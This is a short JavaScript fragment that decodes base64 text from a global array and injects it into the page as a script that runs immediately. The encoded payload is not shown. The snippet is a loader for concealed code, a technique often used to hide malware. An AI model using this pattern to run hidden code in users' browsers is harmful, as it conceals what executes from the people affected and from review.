(function(){
  var bin=atob(window.__RIP_B64.join(""));
  var s=document.createElement("script");
  s.text=bin;
  document.body.appendChild(s);
})();
